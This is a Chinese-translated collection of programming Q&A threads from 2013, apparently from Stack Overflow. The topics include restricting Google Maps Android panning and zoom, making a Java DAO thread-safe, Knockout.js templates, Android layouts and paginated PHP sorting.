> 时间：2013-02-20T10:07:59.377

您可以将其显示为对话框，如下所示：

```
Form1 frm = new Form1();
frm.ShowDialog(this);
frm.Dispose(); 
```

您传递当前`IWin32Window`或`form`您想成为所有者，因此如果您通过单击父表单的按钮调用它，只需传递`this`.

您希望能够获得`IWin32Window`另一个进程，这是可能的，但我不知道是否将表单显示为模态。

```
var proc = Process.GetProcesses().Where(x => x.ProcessName == "notepad").First();
IWin32Window w = Control.FromHandle(proc.MainWindowHandle);

using (Form1 frm = new Form1())
{
    frm.ShowDialog(w);
} 
```

如果可能的话，这就是它的工作方式，但是，它似乎对我不起作用。

此链接可能会提供有关该主题的更多信息：[如何使子进程窗口在我的进程中显示为模态？](https://stackoverflow.com/questions/613513/how-can-i-make-a-child-process-window-to-appear-modal-in-my-process)

# android - 限制滚动和缩放 Google Maps Android API v2

> ID：14977078
> 
> 赞同：17
> 
> 时间：2013-02-20T10:05:46.733
> 
> 标签：android, google-maps-android-api-2

我已将[GroundOverlay](https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/model/GroundOverlay)添加到地图并希望限制此区域内的滚动和缩放。

如何在 android 谷歌地图的某些范围内限制滚动？

是否可以从 MapFragment 立即获得运动点？

请帮我。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2016-10-26T18:04:18.460

**作为Google Play Services 9.4**版本的一部分，约束摄像头（终于！）被添加为一项功能——您可以调用[`setLatLngBoundsForCameraTarget(LatLngBounds bounds)`](https://developers.google.com/android/reference/com/google/android/gms/maps/GoogleMap.html#setLatLngBoundsForCameraTarget(com.google.android.gms.maps.model.LatLngBounds))以设置允许的平移区域。

```
// Create a LatLngBounds that includes the city of Adelaide in Australia.
final LatLngBounds ADELAIDE = new LatLngBounds(
    new LatLng(-35.0, 138.58), new LatLng(-34.9, 138.61));

// Constrain the camera target to the Adelaide bounds.
mMap.setLatLngBoundsForCameraTarget(ADELAIDE); 
```

您可以在文档中找到详尽的解释：[Restricting the user's panning to a given area](https://developers.google.com/maps/documentation/android-api/views#restrict-panning)和[GitHub 中的示例活动](https://github.com/googlemaps/android-samples/blob/master/ApiDemos/app/src/main/java/com/example/mapdemo/CameraClampingDemoActivity.java)。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-04-22T14:51:31.327

可能为时已晚，但这是我的解决方案：

1.  禁用内置 GoogleMap 的手势。

2.  添加了自定义手势（用于滚动、滑动和缩放）。

3.  处理事件时检查允许的区域。

4.  使用标准地图的功能手动设置边界/缩放。

这是我的例子：

**[更新]**

有一个问题 - 在地图初始化之前收到触摸事件。

检查 onInterceptTouchEvent 中的空值

我还发现我的解决方案比内置功能稍慢。

```
import android.content.Context;
import android.graphics.Point;
import android.os.Handler;
import android.util.AttributeSet;
import android.view.GestureDetector;
import android.view.MotionEvent;
import android.view.ScaleGestureDetector;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.maps.CameraUpdate;
import com.google.android.gms.maps.CameraUpdateFactory;
import com.google.android.gms.maps.GoogleMap;
import com.google.android.gms.maps.GoogleMapOptions;
import com.google.android.gms.maps.MapView;
import com.google.android.gms.maps.MapsInitializer;
import com.google.android.gms.maps.model.LatLng;
import com.google.android.gms.maps.model.VisibleRegion;

public class RestrictedMapView extends MapView {

    public static float MAX_ZOOM = 20;
    public static float MIN_ZOOM = 5;
    public static float MIN_ZOOM_FOR_FLING = 7;

    public static double MAX_LONGITUDE = 183.61;
    public static double MIN_LONGITUDE = 159.31;
    public static double MAX_LATITUDE = -32.98;
    public static double MIN_LATITUDE = -53.82;

    public static double DEF_LATITUDE = -41.78;
    public static double DEF_LONGITUDE = 173.02;
    public static float DEF_ZOOM = 7;

    private Handler mHandler = new Handler();
    private Context mContext;
    private VisibleRegion mLastCorrectRegion = null;
    private boolean mIsInAnimation = false;

    public RestrictedMapView(Context c, AttributeSet a, int o) {
        super(c, a, o);
        init(c);
    }
    public RestrictedMapView(Context c, AttributeSet a) {
        super(c, a);
        init(c);
    }
    public RestrictedMapView(Context c) {
        super(c);
        init(c);
    }

    public RestrictedMapView(Context c, GoogleMapOptions o) {
        super(c, o);
        init(c);
    }

    private GestureDetector mGestureDetector = null;
    private GestureDetector.SimpleOnGestureListener mGestudeListener =
            new GestureDetector.SimpleOnGestureListener() {

        @Override
        public boolean onScroll(MotionEvent e1, MotionEvent e2, float distanceX, float distanceY) {
            if (mIsInAnimation) return false;
            GoogleMap map = getMap();
            LatLng target = map.getCameraPosition().target;
            Point screenPoint = map.getProjection().toScreenLocation(target);
            Point newPoint = new Point(screenPoint.x + (int)distanceX, screenPoint.y + (int)distanceY);
            LatLng mapNewTarget = map.getProjection().fromScreenLocation(newPoint);
            CameraUpdate update = CameraUpdateFactory.newLatLngZoom(
                    mapNewTarget,map.getCameraPosition().zoom);         
            tryUpdateCamera(update, 0); 
            return true;
        }

        @Override
        public boolean onFling (MotionEvent e1, MotionEvent e2, float velocityX, float velocityY) {
            if (mIsInAnimation) return false;
            GoogleMap map = getMap();
            double zoom = map.getCameraPosition().zoom;
            if (zoom < MIN_ZOOM_FOR_FLING) 
                return false;
            int velocity = (int) Math.sqrt(velocityX * velocityX + velocityY * velocityY);
            if (velocity < 500) return false;
            double k1 = 0.002d; /*exipemental*/
            double k2 = 0.002d;/*exipemental*/

            LatLng target = map.getCameraPosition().target;
            Point screenPoint = map.getProjection().toScreenLocation(target);
            Point newPoint = new Point(screenPoint.x - (int)(velocityX * k1 * zoom * zoom/*exipemental*/),
                    screenPoint.y - (int)(velocityY * k1 * zoom * zoom/*exipemental*/));
            LatLng mapNewTarget = map.getProjection().fromScreenLocation(newPoint);
            CameraUpdate update = CameraUpdateFactory.newLatLngZoom(
                    mapNewTarget,map.getCameraPosition().zoom); 
            tryUpdateCamera(update, (int)(velocity * k2 * zoom * zoom) /*exipemental*/);    
            return true;
        }
    };  
    private ScaleGestureDetector mScaleGestureDetector = null;
    private ScaleGestureDetector.SimpleOnScaleGestureListener mScaleGestudeListener =
            new ScaleGestureDetector.SimpleOnScaleGestureListener() {

        @Override
        public boolean onScale (ScaleGestureDetector detector) {
            if (mIsInAnimation) return false;

            GoogleMap map = getMap();
            double zoom = map.getCameraPosition().zoom;

            double k = 1d / detector.getScaleFactor();
            int x = (int) detector.getFocusX();
            int y = (int) detector.getFocusY();
            LatLng mapFocus = map.getProjection().
                    fromScreenLocation(new Point(x, y));
            LatLng target = map.getCameraPosition().target;

            zoom = zoom + Math.log(detector.getScaleFactor()) / Math.log(2d);
            if (zoom < MIN_ZOOM)  
                if (zoom == MIN_ZOOM) return false;
                else zoom = MIN_ZOOM;
            if (zoom > MAX_ZOOM) 
                if (zoom == MAX_ZOOM) return false;
                else zoom = MAX_ZOOM;

            double dx = norm(mapFocus.longitude) - norm(target.longitude);
            double dy = mapFocus.latitude - target.latitude;
            double dk = 1d - 1d / k;
            LatLng newTarget = new LatLng(target.latitude - dy * dk, 
                    norm(target.longitude) - dx * dk);

            CameraUpdate update = CameraUpdateFactory.newLatLngZoom(newTarget, (float) zoom);           
            tryUpdateCamera(update, 0);         
            return true;
        }
    };

    private void tryUpdateCamera(CameraUpdate update, int animateTime) {
        GoogleMap map = getMap();
        final VisibleRegion reg = map.getProjection().getVisibleRegion();
        if (animateTime <= 0) {
            map.moveCamera(update);
            checkCurrentRegion(reg);
        } else {
            mIsInAnimation = true;
            map.animateCamera(update, animateTime, new GoogleMap.CancelableCallback() {
                @Override
                public void onFinish() {
                    mIsInAnimation = false;
                    checkCurrentRegion(reg);
                }
                @Override
                public void onCancel() {
                    mIsInAnimation = false;
                    checkCurrentRegion(reg);
                }
            });
        }
    }

    private void checkCurrentRegion(VisibleRegion oldReg) {
        GoogleMap map = getMap();
        VisibleRegion regNew = map.getProjection().getVisibleRegion();
        if (checkBounds(regNew)) {
            mLastCorrectRegion = regNew;
        } else {
            if (mLastCorrectRegion != null)
                oldReg = mLastCorrectRegion;
            mIsInAnimation = true;
            map.animateCamera(CameraUpdateFactory.newLatLngBounds(
                    oldReg.latLngBounds, 0),
                    200, new GoogleMap.CancelableCallback() {
                        @Override
                        public void onFinish() {
                            mIsInAnimation = false;
                        }                       
                        @Override
                        public void onCancel() {
                            mIsInAnimation = false;
                        }
                    });

        }
    }

    /**
     * 
     * 
     * @param lonVal
     * @return
     */
    private double norm(double lonVal) {
        while (lonVal > 360d) lonVal -= 360d;
        while (lonVal < -360d) lonVal += 360d;
        if (lonVal < 0) lonVal = 360d + lonVal;
        return lonVal;
    }

    private double denorm(double lonVal) {
        if (lonVal > 180d) lonVal = -360d + lonVal; 
        return lonVal;
    }

    private boolean checkBounds(VisibleRegion reg) {
        double left = Math.min(
                Math.min(norm(reg.farLeft.longitude), norm(reg.nearLeft.longitude)),
                Math.min(norm(reg.farRight.longitude), norm(reg.nearRight.longitude)));
        double right = Math.max(
                Math.max(norm(reg.farLeft.longitude), norm(reg.nearLeft.longitude)),
                Math.max(norm(reg.farRight.longitude), norm(reg.nearRight.longitude)));
        double top = Math.max( 
                Math.max(reg.farLeft.latitude, reg.nearLeft.latitude),
                Math.max(reg.farRight.latitude, reg.nearRight.latitude));
        double bottom = Math.min( 
                Math.min(reg.farLeft.latitude, reg.nearLeft.latitude),
                Math.min(reg.farRight.latitude, reg.nearRight.latitude));

        boolean limitBounds = left < MIN_LONGITUDE || right > MAX_LONGITUDE ||
                bottom < MIN_LATITUDE || top > MAX_LATITUDE;        
        return !limitBounds;
    }

    private void init(Context c) {
        try {
             MapsInitializer.initialize(c);
         } catch (GooglePlayServicesNotAvailableException e) {
             e.printStackTrace();
         }
        mContext = c;
        mHandler.post(new Runnable() {          
            @Override
            public void run() {
                GoogleMap map = getMap();
                if (map != null) {
                    getMap().getUiSettings().setZoomControlsEnabled(false);
                    map.getUiSettings().setAllGesturesEnabled(false);
                    map.moveCamera(CameraUpdateFactory.newLatLngZoom(
                            new LatLng(DEF_LATITUDE, DEF_LONGITUDE), DEF_ZOOM));
                    mLastCorrectRegion = map.getProjection().getVisibleRegion();
                    mGestureDetector = new GestureDetector(mContext, mGestudeListener);
                    mScaleGestureDetector = new ScaleGestureDetector(mContext, mScaleGestudeListener);
                } else mHandler.post(this);
            }
        });
    }

    @Override
    public boolean onInterceptTouchEvent(MotionEvent event) {
        if (mGestureDetector != null) mGestureDetector.onTouchEvent(event);
        if (mScaleGestureDetector != null) mScaleGestureDetector.onTouchEvent(event);
        return super.onInterceptTouchEvent(event);
    }
} 
```

我的片段的xml布局中的定义：

```
<com.package....RestrictedMapView
    android:id="@+id/mapview"
    android:layout_width="match_parent"
    android:layout_height="match_parent" /> 
```

在 xml 文件中，可以定义自定义缩放/位置按钮并为手动操作相机设置点击侦听器（在这种情况下，您必须检查 MAX_ZOOM 和 MIN_ZOOM，并检查当前位置是否在允许的范围内）。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2014-03-20T12:37:04.603

太糟糕了，谷歌不允许我们拦截和阻止用户，我发现`MaciejGórski`答案是最适合我需要的答案。

我想与您分享我的解决方案（基于他的回答）。

首先我定义了边界和最大/最小缩放：

```
private final LatLngBounds BOUNDS = new LatLngBounds(new LatLng(41.8138,12.3891), new LatLng(41.9667, 12.5938));
private final int MAX_ZOOM = 18;
private final int MIN_ZOOM = 14; 
```

然后我创建了这个小函数来测试当前相机边界是否超出最大边界并返回纬度和经度的差异。

```
/**
 * Returns the correction for Lat and Lng if camera is trying to get outside of visible map
 * @param cameraBounds Current camera bounds
 * @return Latitude and Longitude corrections to get back into bounds.
 */
private LatLng getLatLngCorrection(LatLngBounds cameraBounds) {
    double latitude=0, longitude=0;
    if(cameraBounds.southwest.latitude < BOUNDS.southwest.latitude) {
        latitude = BOUNDS.southwest.latitude - cameraBounds.southwest.latitude;
    }
    if(cameraBounds.southwest.longitude < BOUNDS.southwest.longitude) {
        longitude = BOUNDS.southwest.longitude - cameraBounds.southwest.longitude;
    }
    if(cameraBounds.northeast.latitude > BOUNDS.northeast.latitude) {
        latitude = BOUNDS.northeast.latitude - cameraBounds.northeast.latitude;
    }
    if(cameraBounds.northeast.longitude > BOUNDS.northeast.longitude) {
        longitude = BOUNDS.northeast.longitude - cameraBounds.northeast.longitude;
    }
    return new LatLng(latitude, longitude);
} 
```

然后控制过度滚动（和过度缩放）的处理程序每​​ 100 毫秒限制一次。

```
/**
 * Bounds the user to the overlay.
 */
private class OverscrollHandler extends Handler {
    @Override
    public void handleMessage(Message msg) {
        CameraPosition position = mMap.getCameraPosition();
        VisibleRegion region = mMap.getProjection().getVisibleRegion();
        float zoom = 0;
        if(position.zoom < MIN_ZOOM) zoom = MIN_ZOOM;
        if(position.zoom > MAX_ZOOM) zoom = MAX_ZOOM;
        LatLng correction = getLatLngCorrection(region.latLngBounds);
        if(zoom != 0 || correction.latitude != 0 || correction.longitude != 0) {
            zoom = (zoom==0)?position.zoom:zoom;
            double lat = position.target.latitude + correction.latitude;
            double lon = position.target.longitude + correction.longitude;
            CameraPosition newPosition = new CameraPosition(new LatLng(lat,lon), zoom, position.tilt, position.bearing);
            CameraUpdate update = CameraUpdateFactory.newCameraPosition(newPosition);
            mMap.moveCamera(update);
        }
        /* Recursively call handler every 100ms */
        sendEmptyMessageDelayed(0,100);
    }
} 
```

此处理程序必须定义为当前类中的字段（我在扩展 SupportMapFragment 的类中执行此操作）

```
private OverscrollHandler mOverscrollHandler = new OverscrollHandler(); 
```

最后必须第一次调用它，我在最后做了它以`onActivityCreated`确保地图存在。

```
@Override
public void onActivityCreated(Bundle savedInstanceState) {
    super.onActivityCreated(savedInstanceState);
    mContext = getActivity();
    mMap = getMap();
    mMap.setMapType(GoogleMap.MAP_TYPE_NONE);
    mMap.addTileOverlay(new TileOverlayOptions().tileProvider(new VexLocalTileProvider(getResources().getAssets())));
    CameraUpdate upd = CameraUpdateFactory.newLatLngZoom(new LatLng(41.87145, 12.52849), 14);
    mMap.moveCamera(upd);
    mOverscrollHandler.sendEmptyMessageDelayed(0,100);
} 
```

希望你会发现它有用！

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-29T22:31:07.193

`onCameraChange`您可以尝试使用旧的轮询技术，而不是使用新的闪亮推送技术：`map.getCameraPosition()`或`map.getProjection().getVisibleRegion()`. 然后，您可以检查返回的值是否是您喜欢的，如果不是，`map.moveCamera(...)`.

基本上你需要一个`Handler`，它将获取相机位置的值，`handleMessage`并且你每隔 10ms 左右向这个处理程序发送消息。里面`handleMessage`做`sendEmptyMessageDelayed`。

您也可以使用`Runnable`代替`Message`（但这是一个口味问题）。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-12-07T05:33:24.593

限制缩放，您可以使用此代码

```
private GoogleMap mMap;
// Set a preference for minimum and maximum zoom.
mMap.setMinZoomPreference(6.0f);
mMap.setMaxZoomPreference(14.0f); 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-02-20T10:43:08.537

在地图 API v2 中，GoogleMap 类上有一个 Min/MaxZoomLevel，但我不知道您是否可以以任何方式设置它。

另一种方法是添加一个

```
GoogleMap.OnCameraChangeListener 
```

到您的地图并通过实施

```
public void onCameraChange(CameraPosition cameraPosition); 
```

要限制可见区域，请使用 GoogleMap.moveCamera(cameraPosition)

也就是说，如果您希望用户能够滚动或缩放“一些”。

您还可以通过[GoogleMapOptions完全停用滚动/缩放事件](http://developer.android.com/reference/com/google/android/gms/maps/GoogleMapOptions.html)

# ios - 如果远程可用较新版本，则更新本地捆绑文件

> ID：14977086
> 
> 赞同：0
> 
> 时间：2013-02-20T10:06:08.353
> 
> 标签：ios, objective-c, load, bundle

在应用程序包中，我有一个 PDF 文件，用作“用户指南”或手册。

```
-(void)loadManual
{
    UIWebView *webPDF = [[UIWebView alloc] initWithFrame:self.view.frame];
    webPDF.delegate = self;
    webPDF.backgroundColor = [UIColor blackColor];
    webPDF.opaque = YES;
    [self.view addSubview:webPDF];
    webPDF.center = self.view.center;
    webPDF.tag = 88;

    NSString *thePath = [[NSBundle mainBundle] pathForResource:@"manual" ofType:@"pdf"];
    if (thePath) {
        NSData *pdfData = [NSData dataWithContentsOfFile:thePath];
        [webPDF loadData:pdfData MIMEType:@"application/pdf"
        textEncodingName:@"utf-8" baseURL:nil];
    }
} 
```

**问题**：如何**优雅地**检查我的服务器是否有更新版本的“manual.pdf”，如果服务器上有更新版本，请下载并替换本地文件

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:11:45.913

您可以在两侧计算文件的 md5（有关 iOS 详细信息，请查看[本文），如果结果不同，请从服务器下载新版本。](http://www.joel.lopes-da-silva.com/2010/09/07/compute-md5-or-sha-hash-of-large-file-efficiently-on-ios-and-mac-os-x/)为此，您可以将文件下载到 Documents 文件夹或类似文件夹中，我建议您将其标记为不包含在 iTunes 备份中，这将为您节省一些修改过程的时间

# jquery - 使用jquery在客户端上传图片

> ID：14977088
> 
> 赞同：1
> 
> 时间：2013-02-20T10:06:14.453
> 
> 标签：jquery, file-upload, upload

谁能告诉如何在客户端以 HTML 格式上传图像。图像应显示在 HTML 页面的客户端。

我使用以下链接的代码：

[http://www.html5rocks.com/en/tutorials/file/dndfiles/](http://www.html5rocks.com/en/tutorials/file/dndfiles/)

但它在 IE 中不起作用。

所以我尝试改变我的设计，比如使用文件的路径，但正如浏览器所说的那样，它对我不起作用。

所以我不知道如何支持 IE 上传图片。

请帮助我，如何使用 jquery 在客户端上传图片。我不需要任何 php 插件或代码。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:35:27.970

IE 似乎不支持 FileReader。

SO中的更多细节在[这里](https://stackoverflow.com/questions/5570871/html5-filereader-alternative)

我喜欢同一个答案[FancyUpload中建议的库](http://digitarald.de/project/fancyupload/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:37:22.923

我最喜欢的图片上传器是

[http://blueimp.github.com/jQuery-File-Upload/](http://blueimp.github.com/jQuery-File-Upload/)

# knockout.js - 在已解析的模板中更改选择时更新模板

> ID：14977089
> 
> 赞同：0
> 
> 时间：2013-02-20T10:06:16.263
> 
> 标签：knockout.js, ko.observablearray

我有一个 Observable Array，在其中使用映射插件我在其上映射了来自服务器的 json。json结构是这样的：

```
Data: [{
  NumberOfRooms: 5,
  Category: 1 
  },
  {
  TruckDoorsNo: 5,
  Category: 2
  }] 
```

此 json 包含有关不同类型对象的数据，并根据类别值确定在我的模板中显示和不显示的内容：

```
<div data-bind="foreach: Buildings"> 
<!-- ko if: Category === 1 -->
  <input type="text" data-bind="value: NumberOfRooms" />
  <select data-bind="value: Category">
      <option value="1">Category1</option>
      <option value="2">Category2</option>
  </select>
<!-- /ko -->
<!-- ko if: Category === 2 -->
  <input type="text" data-bind="value: TruckDoorsNo" />
  <select data-bind="value: Category">
      <option value="1">Category1</option>
      <option value="2">Category2</option>
  </select>
<!-- /ko -->
</div> 
```

问题是每个项目的类别都可以从已解析的模板中更改，并且我们希望在发生此更改时更新模板。

我没有这个 ViewModel 的淘汰模型，我直接从服务器映射 json。

如何做到这一点？我试图使类别属性可观察，但这无济于事。

我必须补充一点，我刚开始使用 Knockout，我不知道它的全部功能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:41:45.470

我发现我的模板首先是错误的答案：

代替：

```
<!-- ko if: Category === 2 -->
<!-- /ko --> 
```

正确的方法是：

```
<!-- ko if: Category() == 2 -->
<!-- /ko --> 
```

我使 Category 属性可以像这样观察：

```
ko.utils.arrayForEach(viewModelBuilding.Buildings(), function(item)
    {
        item.Category = ko.observable(item.Category);
    }); 
```

# android - android线性布局基线对齐

> ID：14977096
> 
> 赞同：0
> 
> 时间：2013-02-20T10:06:46.893
> 
> 标签：android, eclipse, user-interface

我有 3 个图像视图，但由于它们重叠，我不会让它们可点击，我想在每个图像视图的顶部制作按钮（但更小）。

我知道`RelativeLayout`使用方法很简单，`align_baseline`但我使用这些图像非常重要，`LinearLayout`因为它们使用`layout_weight`

重要的是按钮与imageview连接，而不仅仅是出现在它上面

这是我的代码，它可能会有所帮助

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:id="@+id/layout"
android:layout_width="match_parent"
android:layout_height="match_parent" >
     ...
      <LinearLayout
            android:layout_width="match_parent"        
            android:layout_height="match_parent" 
            android:layout_above="@+id/twitter"
            android:layout_alignParentLeft="true"
            android:orientation="vertical"
            android:weightSum="3"
            android:layout_marginBottom="25dp"
            android:layout_alignParentTop="true" >
                <ImageView
             android:id="@+id/imgDis"
             android:layout_weight="1"
             android:layout_width="300dp"
             android:layout_height="120dp"
             android:layout_marginBottom="-20dp"
             android:background="@drawable/img1" />

                  <ImageView
            android:id="@+id/imgCal"
             android:layout_weight="1"
            android:layout_width="300dp"
            android:layout_height="120dp"
            android:layout_gravity="right"
            android:layout_marginBottom="-25dp"
            android:background="@drawable/img2"
            android:paddingLeft="25dp" />

        <ImageView
            android:id="@+id/imgDe"
             android:layout_weight="1"
            android:layout_width="300dp"
            android:layout_height="120dp"

            android:background="@drawable/img3" />

        </LinearLayout>
        ...
 </RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:13:32.980

将图像垂直放置在另一个线性布局中，并将该布局放置在主布局中，并赋予此线性布局而不是图像的重量

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:32:46.703

这是您的答案，使用时`weight`您必须`0dp`根据具体情况定义高度/宽度才能查看。

你想要下面`Button`的每一个`Imageview`东西吗？

我试过了，检查下面的xml：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/layout"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        android:layout_marginBottom="25dp"
        android:orientation="vertical"
        android:weightSum="6" >

        <Button
            android:layout_width="wrap_content"
            android:layout_height="0dp"
            android:layout_marginTop="5dp"
            android:layout_weight="0.5"
            android:text="button first" />

        <ImageView
            android:id="@+id/imgDis"
            android:layout_width="300dp"
            android:layout_height="0dp"
            android:layout_marginTop="5dp"
            android:layout_weight="1.5"
            android:background="@drawable/logo" />

        <Button
            android:layout_width="wrap_content"
            android:layout_height="0dp"
            android:layout_marginTop="5dp"
            android:layout_weight="0.5"
            android:text="button first" />

        <ImageView
            android:id="@+id/imgCal"
            android:layout_width="300dp"
            android:layout_height="0dp"
            android:layout_gravity="right"
            android:layout_marginTop="5dp"
            android:layout_weight="1.5"
            android:background="@drawable/logo"
            android:paddingLeft="25dp" />

        <Button
            android:layout_width="wrap_content"
            android:layout_height="0dp"
            android:layout_marginTop="5dp"
            android:layout_weight="0.5"
            android:text="button first" />

        <ImageView
            android:id="@+id/imgDe"
            android:layout_width="300dp"
            android:layout_height="0dp"
            android:layout_marginTop="5dp"
            android:layout_weight="1.5"
            android:background="@drawable/logo" />
    </LinearLayout>

</RelativeLayout> 
```

# sql-server - 在 Crm 2011 中删除自定义实体时出错

> ID：14977097
> 
> 赞同：5
> 
> 时间：2013-02-20T10:06:53.467
> 
> 标签：sql-server, dynamics-crm-2011, crm

我无法删除 MS CRM 2011 汇总 11 中的自定义实体。当我尝试删除实体时（需要 5-7 分钟然后出现错误）CRM 冻结。

SQL 分析器和 DiagTool 没有给出答案。有一些错误，但与 CRM 的工作无关。我已经检查过删除关系，这也是不可能的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-04T09:59:39.857

安装托管解决方案后，您不得删除其任何实体、属性、关系、报告和选项集。如果您绝对需要从部署的托管解决方案中删除其中一个组件，这篇文章提供了一个简单且受支持的解决方法。

阅读此[链接](https://community.dynamics.com/crm/b/gonzaloruiz/archive/2012/05/07/crm-2011-deleting-attributes-entities-relationships-or-optionsets-from-managed-solutions.aspx)以获取更多详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-06-01T16:26:47.550

删除自定义字段，然后尝试删除实体。

# php - php只对分页页面中的记录进行排序

> ID：14977098
> 
> 赞同：0
> 
> 时间：2013-02-20T10:06:53.587
> 
> 标签：php, sorting, pagination

我有一个分页，例如限制为 10。如果我在第 2 页并单击排序，我只想对当前分页页面上显示的记录进行排序；当我回到第 1 页时，我希望在对第 2 页进行排序之前对记录进行排序。任何提示如何实现？

也许是这样的：

```
if ($page == 1){ 
$result = mysql_query("SELECT * FROM users ORDER BY $orderby $sort LIMIT $start, $perpage");
} else {} 
```

但是对于 ELSE，我不知道如何限制当前页面中的 10 条记录。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:17:19.027

每次单击下一页或上一页或排序时，通过 url 传递排序详细信息和页面详细信息，并在 page 中获取它们并在查询中使用它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:18:36.757

这里没有标记Mysql，所以在php中你可以试试

`$arr`包含来自用户表的所有数据

```
// on every page you slice the original array $page_num = 2, $amount_of_items_per_page = 10
$page_arr = array_slice($arr, $page_num*$amout_of_items_per_page, $amout_of_items_per_page); 
```

然后，如果您想以某种方式排序，则必须对 $page_arr 进行排序。

```
sort ($page_arr); 
ksort($page_arr); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:08:39.927

您是否尝试过将当前页面记录存储在 javascript 数组中并在客户端对其进行排序？

# java - Java线程安全DAO

> ID：14977101
> 
> 赞同：1
> 
> 时间：2013-02-20T10:07:01.140
> 
> 标签：java, multithreading, dao

我有一个 DAOClass，它从下面的许多线程中调用，用于插入一组表 -

```
public class DAOClass
{

private HashMap<String, HelperClass> insertBuffer;

public DAOClass() 
{
    insertBuffer = new HashMap<String, HelperClass>();      
}

public int[] createSomeTable(String key, SomeTableRecord someTableRecord) 
{
        List<SomeTableRecord> someTableRecList;
        HelperClass buf = insertBuffer.get(key);
        if (buf == null)
        {
            buf = new HelperClass();
            insertBuffer.put(key, buf);
        }

        someTableRecList = buf.getSomeTableBuffer();
        someTableRecList.add(someTableRecord);

        if(someTableRecList.size() >= Global.limit())
        {
            return flushSomeTableInsertCache(key);
        }
        else
        {
            return null;
        }
}

public int[] flushSomeTableInsertCache(String key)
{
    HelperClass buf = insertBuffer.get(key);
    int[] retVal = null;
    if (buf != null && buf.getSomeTableBuffer() != null)
    {
        retVal = createSomeTableBuffered(buf.getSomeTableBuffer());
        buf.getSomeTableBuffer().clear();
    }
    return retVal;
}

}

public int[] createSomeTableBuffered(final List<SomeTableRecord> someTableRecordList) 
{
  INSERT QUERY GOES HERE from LIST..
}
} 
```

不同的线程调用 createSomeTable 方法，该方法添加到 HelperClass 的 ArrayList。有一个 HashMap 但键是重叠的，即多个线程同时命中同一个键，从而破坏 HashMap 和不合时宜的刷新..

助手类如下 -

```
class HelperClass {

private String key;
private ArrayList<SomeTableRecord> someTableBuffer;
private ArrayList<SomeTable1Record> someTable1Buffer;

HelperClass() {

    someTableBuffer = new ArrayList<SomeTableRecord>();
    someTable1Buffer = new ArrayList<SomeTable1Record>();

}

public ArrayList<SomeTableRecord> getSomeTableBuffer() {
    return someTableBuffer;
}

public ArrayList<SomeTable1Record> getSomeTable1Buffer() {
    return someTable1Buffer;
}
} 
```

但是，这显然不是线程安全的，因为 key 不是不相交的。您能否建议在课程中进行一些更正，以便它是线程安全的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:08:05.257

改用类 ConcurrentHashMap。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:13:55.017

您应该使用而不是使用`ArrayList<HelperClass>`HashMap。为避免冲突，请使用

```
public synchronized int[] createSomeTable(String key, SomeTableRecord someTableRecord) 
```

保护你的缓冲区。

**更新：**

即使在 Spring 中也要保护缓冲区，还要`synchronized`添加`flushSomeTableInsertCache`：

```
public synchronized int[] flushSomeTableInsertCache(String key) 
```

实际上，您不仅仅使用`key`s 来识别元素。

否则，以这种方式观察键冲突不是一个好策略，因为它们甚至可能在 2 次刷新之间发生，所以你应该在数据库中检查它们，或者为键设置一个单独的 HashSet（如果你确定你拥有所有那里的钥匙）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:16:01.640

`insertBuffer`是这里唯一的状态。在多线程环境中修改其内容可能会导致意外行为。您可以同步对它的访问或使用`ConcurrentHashMap`而不是`HashMap`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:24:50.313

我会使用`synchronized`方法而不是`ConcurrentHashMap`. 但是，使用`ConcurrentHashMap`也可以解决您的线程安全问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-20T10:25:16.140

分离用法的最简单方法是`DAOClass`为每个线程创建一个对象。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-20T12:24:59.827

将您的实现更改为 ConcurrentHashMap，这将解决您的并发问题。

# oop - 检查类是否在运行时实现接口

> ID：14977102
> 
> 赞同：2
> 
> 时间：2013-02-20T10:07:03.030
> 
> 标签：oop, language-agnostic

Say`FrameworkA`使用一个`FrameworkA.StandardLogger`用于记录的类。我想用另一个（`SuperLogger`类）替换日志库。

为了实现这一点，有**接口**：`FrameworkA`将提供`FrameworkA.Logger`其他库必须实现的接口。

但是如果其他库没有实现该接口怎么办？`FrameworkA`可能不是一个足够流行的框架来`SuperLogger`关心它的界面。

可能的解决方案是：

*   具有标准化接口（由 JSR、PSR 等标准定义...）
*   写适配器

如果没有标准化的接口，并且如果类兼容，您想避免编写无用适配器的痛苦怎么办？

难道不能有**另一种解决方案来确保类符合合同，但在运行时？**

想象一下（非常简单的伪代码实现）：

```
namespace FrameworkA;
interface Logger {
    void log(message);
}

namespace SuperLoggingLibrary;
class SupperLogger {
    void log(message) {
       // ...
    }
} 
```
